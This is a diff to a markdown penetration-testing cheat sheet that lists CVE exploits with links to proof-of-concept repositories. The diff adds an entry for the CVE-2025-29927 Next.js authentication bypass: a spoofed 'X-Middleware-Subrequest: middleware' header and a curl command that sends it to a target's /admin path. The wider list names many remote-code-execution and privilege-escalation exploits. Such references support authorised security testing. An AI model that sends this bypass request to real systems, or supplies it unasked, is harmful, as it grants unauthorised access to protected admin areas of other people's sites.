@@ -41,6 +41,7 @@
 - [CVE-2024-24919: Check Point Security Gateway Information Disclosure (0-day)](#cve-2024-24919-check-point-security-gateway-information-disclosure-0-day)
 - [CVE-2024-32002: Git: git clone RCE](#cve-2024-32002-git-git-clone-rce)
 - [CVE-2024-47176: EvilCUPS RCE](#cve-2024-47176-evilcups-rce)
+- [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
 - [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -185,6 +186,7 @@
 | CVE-2025-0282 | Ivanti Connect Secure RCE | https://github.com/absholi7ly/CVE-2025-0282-Ivanti-exploit |
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
 | CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
+| CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | GSM Linux Kernel LPE (1) | https://github.com/jmpe4x/GSM_Linux_Kernel_LPE_Nday_Exploit |
@@ -2062,6 +2064,18 @@ if __name__ == "__main__":
         time.sleep(1)
         seconds += 1
 
+```
+
+## CVE-2025-29927: Next.js Authentication Bypass
+
+> https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
+
+```console
+X-Middleware-Subrequest: middleware
+```
+
+```shell
+$ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
 ```
 
 ## GodPotato LPE
